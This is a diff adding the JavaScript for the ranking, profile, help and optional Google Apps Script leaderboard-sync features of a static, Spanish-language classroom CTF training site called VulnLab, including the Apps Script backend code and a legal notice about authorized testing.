+    h+='<div class="flagrow" style="margin-top:14px"><b style="color:var(--green)">🏅 Máquina completada — ¡buen trabajo!</b></div>'
+     +'<button class="btn ghost" onclick="toggleWriteup()">Ver writeup</button><div id="writeup" class="writeup hidden" style="margin-top:14px"></div>';
+  }
+  $('flagbox').innerHTML=h;
+  if(isOwned(m)){
+    $('writeup').innerHTML='<h3>Writeup — '+esc(m.name)+' · '+m.mod+'</h3>'+m.writeup.map((s,i)=>'<div style="margin-bottom:8px"><b style="color:var(--muted)">'+(i+1)+'.</b> '+s+'</div>').join('');
+  }
+}
+function toggleWriteup(){ const w=$('writeup'); if(w) w.classList.toggle('hidden'); }
+
+/* ---------- CLOUD (Google Apps Script, opcional) ---------- */
+const CLOUD_KEY='vulnlab_cloud_v1';
+function loadCloud(){
+  try{ const d=JSON.parse(localStorage.getItem(CLOUD_KEY)); if(d&&d.url) return d; }catch(e){}
+  return { url:'', classId:'tic30' };
+}
+function saveCloud(c){ localStorage.setItem(CLOUD_KEY,JSON.stringify(c)); }
+let CLOUD=loadCloud();
+
+function cloudUrl(params){
+  const u=new URL(CLOUD.url);
+  Object.keys(params).forEach(k=>u.searchParams.set(k,params[k]));
+  return u.toString();
+}
+async function syncUp(){
+  if(!S.user){ toast('Primero pon tu nombre (avatar arriba).'); return; }
+  if(!CLOUD.url){ openCloudModal(); return; }
+  const payload={ action:'submit', classId:CLOUD.classId, name:S.user, xp:S.xp,
+                  machines:MACHINES.filter(isOwned).map(m=>m.name).join(', ') };
+  toast('⇆ Subiendo progreso a la clase…');
+  try{
+    const r=await fetch(CLOUD.url,{ method:'POST', headers:{'Content-Type':'text/plain;charset=utf-8'},
+      body:JSON.stringify(payload) });
+    const t=await r.text();
+    if(t.indexOf('OK')>=0) toast('✅ Progreso subido: <b>'+S.xp+' XP</b> · '+esc(S.user));
+    else toast('⚠ Respuesta inesperada del endpoint: '+esc(t.slice(0,80)));
+  }catch(e){ toast('❌ Error al conectar con el endpoint. Revisa la URL (y que esté desplegado como «Anyone»). Detalle: '+esc(e.message||e)); }
+}
+async function syncDown(){
+  if(!CLOUD.url){ openCloudModal(); return; }
+  const box=$('globalRank');
+  if(box){ box.innerHTML='<span class="dim">Descargando ranking de la clase…</span>'; }
+  try{
+    const r=await fetch(cloudUrl({action:'leaderboard',classId:CLOUD.classId}));
+    const data=JSON.parse(await r.text());
+    if(!Array.isArray(data)) throw new Error('formato inesperado');
+    if(box){
+      if(!data.length){ box.innerHTML='<span class="dim">Aún nadie ha subido progreso en esta clase.</span>'; return; }
+      box.innerHTML='<table><tr><th>#</th><th>Alumno</th><th>XP</th><th>Máquinas</th><th>Última sync</th></tr>'
+       +data.map((e,i)=>'<tr class="'+(e.name===S.user?'me':'')+'"><td>'+(i+1)+'</td><td><b>'+esc(e.name)+'</b>'
+        +(e.name===S.user?' <span style="color:var(--green);font-size:11px">(tú)</span>':'')+'</td><td>'+e.xp+' XP</td>'
+        +'<td>'+esc(e.machines||'—')+'</td><td style="color:var(--muted)">'+esc(e.stamp||'')+'</td></tr>').join('')+'</table>';
+    }
+  }catch(e){
+    if(box) box.innerHTML='<span class="err">❌ No se pudo descargar el ranking: '+esc(e.message||e)+'</span>';
+  }
+}
+function openCloudModal(){
+  $('modal').innerHTML='<div class="modal-bg"><div class="modal" style="text-align:left;width:min(560px,92vw)">'
+   +'<h2 style="text-align:center">⚙️ Ranking global de la clase</h2>'
+   +'<p style="text-align:center">Opcional: conecta la plataforma con un Google Apps Script para compartir el ranking entre todos los alumnos.</p>'
+   +'<div class="flagrow"><span style="min-width:110px;font-size:12px;color:var(--muted)">Endpoint URL</span>'
+   +'<input id="cloudUrlInput" style="flex:1;min-width:240px;background:#060b12;border:1px solid var(--border);border-radius:8px;padding:9px 12px;color:var(--text);font-family:monospace;font-size:12px" placeholder="https://script.google.com/macros/s/AKfy.../exec" value="'+esc(CLOUD.url)+'"></div>'
+   +'<div class="flagrow"><span style="min-width:110px;font-size:12px;color:var(--muted)">ID de clase</span>'
+   +'<input id="cloudClassInput" style="flex:1;min-width:180px;background:#060b12;border:1px solid var(--border);border-radius:8px;padding:9px 12px;color:var(--text);font-family:monospace;font-size:12px" value="'+esc(CLOUD.classId)+'"></div>'
+   +'<div style="display:flex;gap:10px;justify-content:center;margin-top:14px;flex-wrap:wrap">'
+   +'<button class="btn" onclick="saveCloudCfg()">Guardar</button>'
+   +'<button class="btn ghost" onclick="closeModal()">Cerrar</button></div>'
+   +'<h3 style="margin-top:18px;color:var(--orange);font-size:13px;text-transform:uppercase;letter-spacing:1px">Código del Apps Script (para el profesor)</h3>'
+   +'<p style="font-size:12px">1. Crea un Google Sheet → <b>Extensiones → Apps Script</b>. 2. Pega este código. '
+   +'3. <b>Implementar → Nueva implementación → Aplicación web</b>, ejecutar como <b>Yo</b>, acceso <b>Cualquiera</b>. 4. Copia la URL /exec y pégala arriba.</p>'
+   +'<pre id="gasCode" style="background:#060b12;border:1px solid var(--border);border-radius:8px;padding:12px;font-size:11px;overflow-x:auto;white-space:pre;max-height:220px;overflow-y:auto">'+esc(GAS_CODE)+'</pre>'
+   +'<div style="text-align:center;margin-top:10px"><button class="btn ghost" onclick="copyGas()">📋 Copiar código</button></div>'
+   +'</div></div>';
+}
+function saveCloudCfg(){
+  CLOUD.url=$('cloudUrlInput').value.trim();
+  CLOUD.classId=$('cloudClassInput').value.trim()||'tic30';
+  saveCloud(CLOUD); closeModal();
+  toast('✅ Configuración de clase guardada.');
+  if(currentView==='ranking') renderRanking();
+}
+function copyGas(){
+  const t=$('gasCode').textContent;
+  if(navigator.clipboard) navigator.clipboard.writeText(t).then(()=>toast('📋 Código copiado al portapapeles'));
+  else toast('Selecciona y copia manualmente');
+}
+const GAS_CODE=[
+'/** VulnLab — backend del ranking de clase (Google Apps Script) **/',
+'function doGet(e) {',
+'  var action = e.parameter.action || "";',
+'  var classId = e.parameter.classId || "tic30";',
+'  var sheet = SpreadsheetApp.getActiveSheet();',
+'  if (action === "leaderboard") {',
+'    var rows = sheet.getDataRange().getValues();',
+'    var out = [];',
+'    for (var i = 1; i < rows.length; i++) {',
+'      if (rows[i][0] !== classId) continue;',
+'      out.push({ name: rows[i][1], xp: rows[i][2], machines: rows[i][3], stamp: rows[i][4] });',
+'    }',
+'    out.sort(function(a,b){ return b.xp - a.xp; });',
+'    return ContentService.createTextOutput(JSON.stringify(out)).setMimeType(ContentService.MimeType.JSON);',
+'  }',
+'  return ContentService.createTextOutput("OK");',
+'}',
+'',
+'function doPost(e) {',
+'  var d = JSON.parse(e.postData.contents);',
+'  if (d.action !== "submit") return ContentService.createTextOutput("OK");',
+'  var sheet = SpreadsheetApp.getActiveSheet();',
+'  var rows = sheet.getDataRange().getValues();',
+'  var now = new Date().toLocaleString("es-ES");',
+'  for (var i = 1; i < rows.length; i++) {',
+'    if (rows[i][0] === d.classId && rows[i][1] === d.name) {',
+'      sheet.getRange(i+1, 3, 1, 3).setValues([[d.xp, d.machines, now]]);',
+'      return ContentService.createTextOutput("OK updated");',
+'    }',
+'  }',
+'  sheet.appendRow([d.classId, d.name, d.xp, d.machines, now]);',
+'  return ContentService.createTextOutput("OK created");',
+'}'
+].join('\n');
+
+
+function renderRanking(){
+  const rows=[...fakeUsers];
+  if(S.user) rows.push([S.user,rankOf(S.xp).name,S.xp,true]);
+  rows.sort((a,b)=>b[2]-a[2]);
+  app.innerHTML='<h2 style="font-size:22px">Ranking de la clase</h2>'
+   +'<p style="color:var(--muted);font-size:13px;margin:6px 0 18px">Los demás alumnos son simulados. Tu fila aparece destacada.</p>'
+   +'<div style="display:flex;gap:10px;margin:18px 0 8px;flex-wrap:wrap">'
+   +'<button class="btn" onclick="syncUp()">⇆ Subir mi progreso</button>'
+   +'<button class="btn ghost" onclick="syncDown()">🌐 Descargar ranking global</button>'
+   +'<button class="btn ghost" onclick="openCloudModal()">⚙️ Configurar clase</button></div>'
+   +'<h3 style="font-size:14px;color:var(--orange);margin-top:18px;text-transform:uppercase;letter-spacing:1px">Ranking global de la clase</h3>'
+   +'<div class="flagbox" id="globalRank" style="margin-top:10px"><span class="dim" style="color:var(--muted);font-size:13px">'+(CLOUD.url?'Pulsa «Descargar ranking global» para actualizar.':'Sin configurar — pulsa ⚙️ Configurar clase para conectar el Google Apps Script del curso.')+'</span></div>'
+   +'<h3 style="font-size:14px;color:var(--orange);margin-top:22px;text-transform:uppercase;letter-spacing:1px">Ranking local (simulado)</h3>'
+   +'<table style="margin-top:10px"><tr><th>#</th><th>Alumno</th><th>Rango</th><th>XP</th><th>Máquinas</th></tr>'
+   +rows.map((r,i)=>{
+      const mine=r[3]===true;
+      const pwned=mine? MACHINES.filter(isOwned).length : Math.min(MACHINES.length,Math.floor(r[2]/70));
+      return '<tr class="'+(mine?'me':'')+'"><td>'+(i+1)+'</td><td><b>'+esc(r[0])+'</b>'+(mine?' <span style="color:var(--green);font-size:11px">(tú)</span>':'')+'</td>'
+        +'<td><span class="rankname">'+esc(r[1])+'</span></td><td>'+r[2]+' XP</td><td>'+pwned+' / '+MACHINES.length+'</td></tr>';
+    }).join('')+'</table>';
+  if(CLOUD.url) syncDown();
+}
+
+/* ---------- PERFIL ---------- */
+function renderProfile(){
+  const r=rankOf(S.xp), n=nextRank(S.xp);
+  const owned=MACHINES.filter(isOwned).length;
+  const flagsTotal=Object.keys(S.flags).length;
+  app.innerHTML='<h2 style="font-size:22px">Mi progreso</h2>'
+   +'<div class="flagbox" style="margin-top:18px"><h3>'+esc(S.user||'Alumno sin identificar')+' · Rango: <span class="rankname">'+r.name+'</span> · '+S.xp+' XP</h3>'
+   +'<div style="margin:10px 0 14px"><button class="btn ghost" onclick="askName(true)">✏️ Cambiar mi nombre</button></div>'
+   +(n? '<p style="font-size:13px;color:var(--muted);margin-bottom:10px">Te faltan <b style="color:var(--text)">'+(n.xp-S.xp)+' XP</b> para <b>'+n.name+'</b>.</p>'
+      : '<p style="font-size:13px;color:var(--green)">¡Rango máximo alcanzado! 🏆</p>')
+   +'<table><tr><th>Métrica</th><th>Valor</th></tr>'
+   +'<tr><td>Máquinas completadas</td><td>'+owned+' / '+MACHINES.length+'</td></tr>'
+   +'<tr><td>Flags conseguidas</td><td>'+flagsTotal+' / '+(MACHINES.length*3)+'</td></tr>'
+   +'<tr><td>Herramientas practicadas</td><td>'+TOOLS.filter(t=>MACHINES.filter(m=>m.tools.includes(t)).some(isOwned)).length+' / '+TOOLS.length+'</td></tr></table>'
+   +'<div style="margin-top:16px"><button class="btn ghost" onclick="resetAll()">Borrar progreso</button></div></div>';
+}
+function resetAll(){ localStorage.removeItem(SAVE_KEY); S=load(); refreshHeader(); toast('Progreso reiniciado.'); view('machines'); }
+
+/* ---------- GUÍA ---------- */
+function renderHelp(){
+  app.innerHTML='<h2 style="font-size:22px">Guía rápida</h2>'
+  +'<div class="writeup" style="margin-top:18px"><h3>Cómo funciona</h3>'
+  +'<p>Plataforma CTF 100% estática para GitHub Pages. Cada máquina simula un escenario real y su terminal interpreta los comandos de las herramientas asociadas: la salida contiene las flags. Progreso en <code>localStorage</code>.</p>'
+  +'<h3 style="margin-top:14px">Herramientas que practicarás</h3>'
+  +'<p><b>nmap</b> (recon) · <b>Hydra</b> (fuerza bruta) · <b>John the Ripper / Hashcat</b> (cracking) · <b>Metasploit</b> (explotación) · <b>searchsploit</b> (CVEs) · <b>Nikto / Gobuster / sqlmap</b> (web) · <b>Wireshark / tcpdump</b> (análisis de tráfico) · <b>Suricata + Wazuh</b> (detección/SIEM) · <b>Responder</b> (AD) · <b>netcat</b> (banner grabbing) · <b>AWS CLI / Docker</b> (cloud).</p>'
+  +'<h3 style="margin-top:14px">Publicar en GitHub Pages</h3>'
+  +'<p>Descarga este HTML como <code>index.html</code>, súbelo a la rama <code>main</code> de un repo y activa <b>Settings → Pages → Branch: main</b>. Quedará en <code>https://usuario.github.io/repo/</code>. Sin servidor ni base de datos.</p>'
+  +'<h3 style="margin-top:14px">⚠️ Aviso legal</h3>'
+  +'<p>Simulación con fines exclusivamente educativos. En el mundo real, prueba solo sistemas con <b>autorización escrita</b>. El acceso no autorizado es un delito (art. 197.3 CP / CFAA).</p></div>';
+}
+
+/* init */
+refreshHeader();
+if(S.user){ $('avatar').textContent=S.initials; }
+else { setTimeout(askName,600); }
+view('machines');
+</script>
+</body>
+</html>
